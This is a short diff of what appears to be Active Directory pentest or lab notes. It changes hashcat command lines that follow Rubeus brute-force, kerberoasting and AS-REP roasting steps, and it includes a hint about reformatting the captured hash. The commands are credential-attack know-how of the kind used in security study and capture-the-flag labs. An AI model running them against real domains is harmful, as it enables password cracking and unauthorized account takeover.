@@ -407,14 +407,14 @@ Rubeus.exe brute /password:Password1 /noticket
 kerberoast and crack hash
 ```
 Rubeus.exe kerberoast
-hashcat -m 13100 -a 0 hash.txt Pass.txt
+hashcat -m 13100 hash.txt Pass.txt --force
 ```
 
 asproast and crack hash
 ```
 Rubeus.exe asreproast
 # Insert 23$ after $krb5asrep$ so that the first line will be $krb5asrep$23$User.....
-hashcat -m 18200 hash.txt Pass.txt
+hashcat -m 18200 hash.txt Pass.txt --force
 ```
 
 Which user account can you query a ticket from with no password?
